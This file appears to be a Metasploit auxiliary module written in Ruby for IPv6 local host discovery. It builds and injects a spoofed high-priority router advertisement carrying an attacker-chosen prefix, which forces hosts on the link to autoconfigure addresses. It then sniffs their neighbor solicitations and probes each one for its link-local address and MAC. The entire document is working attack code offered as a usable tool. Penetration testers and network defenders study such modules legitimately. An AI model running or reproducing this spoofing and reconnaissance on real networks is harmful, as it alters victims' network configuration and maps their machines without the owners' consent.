##
# $Id$
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Capture
	include Msf::Exploit::Remote::Ipv6
	include Msf::Auxiliary::Report
	def initialize
		super(
		'Name'        => 'IPv6 Local Neighbor Discovery Using Router Advertisment',
		'Version'     => '$Revision$',
		'Description' => %q{
				Send a spoofed router advertisment with high priority to force hosts to
				start the IPv6 address auto-config. Monitor for IPv6 host advertisments,
				and try to guess the link-local address by concatinating the prefix, and
				the host portion of the IPv6 address.  Use NDP host solicitation to
				determine if the IP address is valid'
		},
		'Author'      => 'wuntee',
		'License'     => MSF_LICENSE,
		'References'    =>
		[
			['URL','http://wuntee.blogspot.com/2010/11/ipv6-link-local-host-discovery-concept.html']
		]
		)

		register_options(
		[
			OptInt.new('TIMEOUT_NEIGHBOR', [true, "Time (seconds) to listen for a solicitation response.", 1])
		], self.class)

		register_advanced_options(
			[
				OptString.new('PREFIX', [true, "Prefix that each host should get an IPv6 address from",
					"2001:1234:DEAD:BEEF::"]
				)
			], self.class)

		deregister_options('SNAPLEN', 'FILTER', 'RHOST', 'PCAPFILE')
	end

	def listen_for_neighbor_solicitation(opts = {})
		hosts = []
		timeout = opts['TIMEOUT'] || datastore['TIMEOUT']
		prefix = opts['PREFIX'] || datastore['PREFIX']

		max_epoch = ::Time.now.to_i + timeout
		autoconf_prefix = IPAddr.new(prefix).to_string().slice(0..19)

		while(::Time.now.to_i < max_epoch)
			pkt = capture.next()
			next if not pkt
			eth = Racket::L2::Ethernet.new(pkt)

			next if not eth.ethertype.eql?(Racket::L2::Ethernet::ETHERTYPE_IPV6)
			ipv6 = Racket::L3::IPv6.new(eth.payload)

			next if not ipv6.nhead == 0x3a
			icmpv6 = Racket::L4::ICMPv6.new(ipv6.payload)

			next if not icmpv6.type == Racket::L4::ICMPv6Generic::ICMPv6_TYPE_NEIGHBOR_SOLICITATION

			icmpv6 = Racket::L4::ICMPv6NeighborAdvertisement.new(ipv6.payload)
			host_addr = Racket::L3::Misc.long2ipv6(icmpv6.address)

			# Make sure host portion is the same as what we requested
			host_addr_prefix = IPAddr.new(host_addr).to_string().slice(0..19)
			next if not host_addr_prefix.eql?(autoconf_prefix)

			next if not hosts.index(host_addr).eql?(nil)
			hosts.push(host_addr)
			print_status("   |*| #{host_addr}")
		end

		return(hosts)
	end

	def find_link_local(opts = {})
		shost = opts['SHOST'] || datastore['SHOST'] || ipv6_link_address
		hosts = opts['HOSTS'] || []
		smac  = opts['SMAC'] || datastore['SMAC'] || ipv6_mac
		timeout = opts['TIMEOUT_NEIGHBOR'] || datastore['TIMEOUT_NEIGHBOR']
		network_prefix = Rex::Socket.addr_aton(shost)[0,8]

		hosts.each() do |g|
			host_postfix = Rex::Socket.addr_aton(g)[8,8]
			local_ipv6   = Rex::Socket.addr_ntoa(network_prefix + host_postfix)
			mac = solicit_ipv6_mac(local_ipv6, {"TIMEOUT" => timeout})
			if mac
				# report_host(:mac => mac, :host => local_ipv6)
				print_status("   |*| #{local_ipv6} -> #{mac}")
			end
		end
	end

	def create_router_advertisment(opts = {})
	
		dhost = "FF02::1"
		smac = opts['SMAC'] || datastore['SMAC'] || ipv6_mac
		shost = opts['SHOST'] || datastore['SHOST'] || ipv6_link_address
		lifetime = opts['LIFETIME'] || datastore['TIMEOUT']
		prefix = opts['PREFIX'] || datastore['PREFIX']
		plen = 64

		dmac = "33:33:00:00:00:01"
		
		p = Racket::Racket.new
		p.l2 = Racket::L2::Ethernet.new()
		p.l2.src_mac = smac
		p.l2.dst_mac = dmac
		p.l2.ethertype = Racket::L2::Ethernet::ETHERTYPE_IPV6

		p.l3 = Racket::L3::IPv6.new()
		p.l3.ttl = 255
		p.l3.nhead = 58
		p.l3.src_ip = Racket::L3::Misc.ipv62long(shost)
		p.l3.dst_ip = Racket::L3::Misc.ipv62long(dhost)

		p.l4 = ICMPv6RouterAdvertisementFixed.new()
		p.l4.managed_config = 0
		p.l4.other_config = 0
		p.l4.preference = 1
		p.l4.lifetime = 1800
		p.l4.hop_limit = 0

		# OPTION lladdress
		option_dst_lladdr = ICMPv6OptionLinkAddress.new()
		option_dst_lladdr.lladdr = smac
		p.l4.add_option(ICMPv6OptionLinkAddress::ICMPv6_OPTION_TYPE_ID, option_dst_lladdr)

		# OPTION Prefix Information
		option_prefix = ICMPv6OptionPrefixInformation.new()
		option_prefix.plen = plen
		option_prefix.on_link = 1
		option_prefix.addrconf = 1
		option_prefix.valid_lifetime = lifetime
		option_prefix.preferred_lifetime = lifetime
		option_prefix.prefix = Racket::L3::Misc.ipv62long(prefix)
		p.l4.add_option(ICMPv6OptionPrefixInformation::ICMPv6_OPTION_TYPE_ID, option_prefix)

		p.l4.fix!(p.l3.src_ip, p.l3.dst_ip)

		return(p)
	end

	def run
		# Start caputure
		open_pcap({'FILTER' => "icmp6"})

		# Send router advertisment
		print_status("Sending router advertisment...")
		pkt = create_router_advertisment()
		capture.inject(pkt.pack())

		# Listen for host advertisments
		print_status("Listening for neighbor solicitation...")
		hosts = listen_for_neighbor_solicitation()

		if(hosts.size() == 0)
			print_status("No hosts were seen sending a neighbor solicitation")
		else
			# Attempt to get link local addresses
			print_status("Attempting to solicit link-local addresses...")
			find_link_local({"HOSTS" => hosts})
		end

		# Close capture
		close_pcap()
	end

class ICMPv6OptionPrefixInformation < RacketPart
	ICMPv6_OPTION_TYPE_ID = 3
	unsigned :plen, 8
	unsigned :on_link, 1
	unsigned :addrconf, 1
	unsigned :reserved, 6
	unsigned :valid_lifetime, 32
	unsigned :preferred_lifetime, 32
	unsigned :reserved2, 32
	unsigned :prefix, 128
	def initialize(*args)
		super(*args)
	end
end

class ICMPv6RouterAdvertisementFixed < Racket::L4::ICMPv6Generic
	# default value that should be placed in the hop count field of the IP header
	# for outgoing IP packets
	unsigned :hop_limit, 8
	# boolean, managed address configuration?
	unsigned :managed_config, 1
	# boolean, other configuration?
	unsigned :other_config, 1
	unsigned :home_config, 1
	unsigned :preference, 2
	unsigned :proxied, 1
	# set to 0, never used.
	unsigned :reserved, 2
	# lifetime associated with the default router in seconds
	unsigned :lifetime, 16
	# time in milliseconds that a node assumes a neighbor is reachable after
	# having received a reachability confirmation
	unsigned :reachable_time, 32
	# time in milliseconds between retransmitted neighbor solicitation messages
	unsigned :retrans_time, 32
	rest :payload
	def initialize(*args)
		super(*args)
		self.type = ICMPv6_TYPE_ROUTER_ADVERTISEMENT
	end
end

end
